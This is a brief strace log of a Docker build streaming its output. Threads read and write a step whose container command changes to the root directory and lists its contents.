113251 03:07:16.242014 ppoll([{fd=11<UNIX-STREAM:[280011->280012]>, events=POLLIN}, {fd=3<pipe:[279955]>, events=POLLIN}, {fd=9</dev/ptmx<char 5:2>>, events=POLLIN}, {fd=8</dev/tty<char 5:0>>, events=POLLIN}], 4, NULL, NULL, 8 <unfinished ...>
113258 03:07:16.242064 <... epoll_pwait resumed>[{events=EPOLLIN|EPOLLOUT, data={u32=3998744578, u64=9204545914999930882}}], 128, 4821, NULL, 0) = 1 <0.000465>
113258 03:07:16.242108 futex(0x55c9e4ddd060, FUTEX_WAKE_PRIVATE, 1) = 1 <0.000006>
113254 03:07:16.242130 <... futex resumed>) = 0 <0.000139>
113258 03:07:16.242140 read(3<UNIX-STREAM:[280071->279015]>,  <unfinished ...>
113254 03:07:16.242156 nanosleep({tv_sec=0, tv_nsec=20000},  <unfinished ...>
113258 03:07:16.242204 <... read resumed>"43\r\n{\"stream\":\"Step 3/3 : CMD cd ../../../../../../ \\u0026\\u0026 ls\"}\r\n\r\n", 4096) = 73 <0.000053>
113258 03:07:16.242237 write(1</dev/pts/8<char 136:8>>, "Step 3/3 : CMD cd ../../../../../../ && ls", 42) = 42 <0.000012>
113251 03:07:16.242274 <... ppoll resumed>) = 1 ([{fd=9, revents=POLLIN}]) <0.000240>
113258 03:07:16.242288 read(3<UNIX-STREAM:[280071->279015]>,  <unfinished ...>
113251 03:07:16.242301 rt_sigaction(SIGTTIN, {sa_handler=0x5567758b9420, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7f1dfcf20510},  <unfinished ...>
113258 03:07:16.242312 <... read resumed>0xc00032c000, 4096) = -1 EAGAIN (Resource temporarily unavailable) <0.000015>
113251 03:07:16.242324 <... rt_sigaction resumed>{sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f1dfcf20510}, 8) = 0 <0.000015>
113258 03:07:16.242335 epoll_pwait(4<anon_inode:[eventpoll]>,  <unfinished ...>
113251 03:07:16.242346 read(9</dev/ptmx<char 5:2>>,  <unfinished ...>
113258 03:07:16.242359 <... epoll_pwait resumed>[], 128, 0, NULL, 0) = 0 <0.000016>
113251 03:07:16.242369 <... read resumed>"Step 3/3 : CMD cd ../../../../../../ && ls", 65536) = 42 <0.000014>
113258 03:07:16.242380 epoll_pwait(4<anon_inode:[eventpoll]>,  <unfinished ...>
